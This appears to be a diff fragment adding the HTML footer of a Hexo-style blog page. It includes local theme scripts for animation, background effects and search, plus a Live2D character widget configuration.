+  <span class="author" itemprop="copyrightHolder">h3art3ars</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+	
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
